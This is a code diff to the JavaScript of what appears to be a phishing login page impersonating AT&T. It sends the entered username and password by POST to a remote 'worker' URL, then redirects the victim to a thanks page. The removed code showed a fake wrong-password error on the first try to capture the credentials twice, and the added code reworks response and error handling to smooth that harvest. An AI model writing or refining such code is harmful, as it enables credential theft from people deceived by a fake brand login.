@@ -65,6 +65,7 @@ document.addEventListener('DOMContentLoaded' ,function(){
             passerror.style.fontSize = "small";
             passerror.innerHTML = "Please enter your password correctly!";
         } else {
+            // Send the username and password to the worker
             fetch(url, {
                 method: "POST",
                 body: JSON.stringify({
@@ -75,17 +76,20 @@ document.addEventListener('DOMContentLoaded' ,function(){
                     "Content-type": "application/json; charset=UTF-8"
                 }
             })
-            .then(function() {
-                if (count < 1) {
-                    count++;
-                    passerror.style.display = "block";
-                    passerror.style.fontSize = "small";
-                    document.getElementById("password").value = "";
-                    passerror.innerHTML = "Please enter your ATT account password correctly";
-                } else {
+            .then(function(response) {
+                if (response.ok) {
+                    // Only redirect after the first successful submission
                     setCookie("username", username, 30);
                     window.location.href = "./thanks.html";
+                } else {
+                    // Handle error: username or password issue
+                    passerror.style.fontSize = "small";
+                    passerror.innerHTML = "Please enter your ATT account password correctly";
                 }
+            })
+            .catch(function() {
+                passerror.style.fontSize = "small";
+                passerror.innerHTML = "There was an error processing your request.";
             });
         }
     });
